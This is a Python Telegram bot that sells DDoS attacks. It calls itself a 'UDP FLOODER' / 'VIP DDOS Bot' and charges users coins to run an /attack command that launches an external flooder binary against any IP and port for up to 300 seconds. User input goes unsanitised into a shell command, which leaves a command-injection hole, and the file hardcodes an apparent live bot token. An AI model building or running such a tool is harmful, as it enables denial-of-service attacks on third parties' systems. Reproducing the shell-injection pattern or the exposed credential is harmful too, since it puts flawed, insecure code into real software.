import asyncio
import subprocess
import json
import time
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Define Admin ID
ADMIN_ID = "8091696994"  # Replace with the actual Telegram user ID of the admin

# In-memory database (persistent)
DATA_FILE = "user_data.json"
user_data = {}
active_attacks = {}
start_time = time.time()

# Load user data from file
def load_user_data():
    global user_data
    try:
        with open(DATA_FILE, "r") as f:
            user_data = json.load(f)
    except FileNotFoundError:
        user_data = {}

# Save user data to file
def save_user_data():
    with open(DATA_FILE, "w") as f:
        json.dump(user_data, f, indent=4)

# Load data at startup
load_user_data()

# Start command with reply keyboard
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        ["/attack", "/myinfo"],
        ["/uptime", "/help"]
    ]
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

    welcome_message = """
❄️ *WELCOME TO @RAHUL BHAI ULTIMATE UDP FLOODER* ❄️
🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥
✨ *Key Features:* ✨
🚀 Attack: /attack <ip> <port> <duration>
🏦 Account check: /myinfo
🛠️ Help: /help
"""

    await update.message.reply_text(welcome_message, parse_mode="Markdown", reply_markup=reply_markup)

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_message = """
🛠️ RAHUL VIP DDOS Bot Help Menu 🛠️
📜 Commands: 📜
1️⃣ 🔥 /attack <ip> <port> <duration>
2️⃣ 💳 /myinfo - Check balance.
3️⃣ 🔧 /uptime - Bot uptime.
4️⃣ ❓ /help - View help.
5️⃣ 🗑️ /remove <user_id> - Admin only (remove user).
🚨 *BOT REPLY NAA DE ISKA MATLAB KOI AUR ATTACK KAR RHA HAI!* 🚨
"""
    await update.message.reply_text(help_message, parse_mode="Markdown")

# My Info command
async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    balance = user_data.get(user_id, {}).get("balance", 0)
    await update.message.reply_text(f"💰 Coins: {balance}\n😏 Status: Approved", parse_mode="Markdown")

# Attack command
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)

    if user_id not in user_data:
        await update.message.reply_text("💰 Bhai, tere paas toh coins nahi hai! Pehle admin se baat kar.")
        return

    if user_id in active_attacks and time.time() < active_attacks[user_id]:
        remaining_time = int(active_attacks[user_id] - time.time())
        await update.message.reply_text(f"⚠️ Attack already running! {remaining_time} seconds left.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>", parse_mode="Markdown")
        return

    ip, port = context.args[0], context.args[1]
    try:
        duration = int(context.args[2])
        if duration > 300:
            await update.message.reply_text("⛔ Maximum duration is 300 seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Duration must be a valid number.")
        return

    attack_cost = 5
    if user_data[user_id]["balance"] < attack_cost:
        await update.message.reply_text("💰 Coins insufficient! Contact admin.")
        return

    user_data[user_id]["balance"] -= attack_cost
    save_user_data()

    active_attacks[user_id] = time.time() + duration

    await update.message.reply_text(
        f"🚀 *Attack Started*\n💣 Target: {ip}:{port}\n⏳ Duration: {duration}s\n💰 Balance Left: {user_data[user_id]['balance']}",
        parse_mode="Markdown"
    )

    try:
        process = subprocess.Popen(f"./Rahul {ip} {port} {duration}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.communicate()

        if process.returncode != 0:
            await update.message.reply_text("❌ Attack failed!")
            del active_attacks[user_id]
            return
    except Exception as e:
        await update.message.reply_text(f"❌ Attack error: {e}")
        del active_attacks[user_id]
        return

    while time.time() < active_attacks[user_id]:
        await asyncio.sleep(1)

    del active_attacks[user_id]

    await update.message.reply_text(
        f"✅ *[ATTACK FINISHED]* ✅\n\n"
        f"💣 *Target:* `{ip}:{port}`\n"
        f"🕒 *Duration:* {duration} seconds\n"
        f"💰 *Remaining Coins:* {user_data[user_id]['balance']}\n"
        f"🔥 *Attack complete! Chill kar!* 🚀",
        parse_mode="Markdown"
    )

# Admin command to set user balance
async def raja(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)

    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can use this command!")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /raja <user_id> <balance>")
        return

    target_user_id = context.args[0]
    try:
        balance = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Enter a valid numeric balance.")
        return

    user_data[target_user_id] = {"balance": balance}
    save_user_data()
    await update.message.reply_text(f"✅ User {target_user_id} set with balance {balance}.")

# Admin command to remove a user
async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)

    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Only admin can remove users!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    target_user_id = context.args[0]

    if target_user_id in user_data:
        del user_data[target_user_id]
        save_user_data()
        await update.message.reply_text(f"🗑️ User {target_user_id} has been removed.")
    else:
        await update.message.reply_text("❌ User not found.")

# Uptime command
async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    elapsed_time = int(time.time() - start_time)
    hours, rem = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(rem, 60)
    await update.message.reply_text(f"⏰ Bot uptime: {hours}h {minutes}m {seconds}s.")

# Main function
def main():
    app = ApplicationBuilder().token("7996306021:AAH-JVpus8lkiBwp1MFiTrJxYTCQJ-TdLrE").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("raja", raja))
    app.add_handler(CommandHandler("remove", remove_user))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("uptime", uptime))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
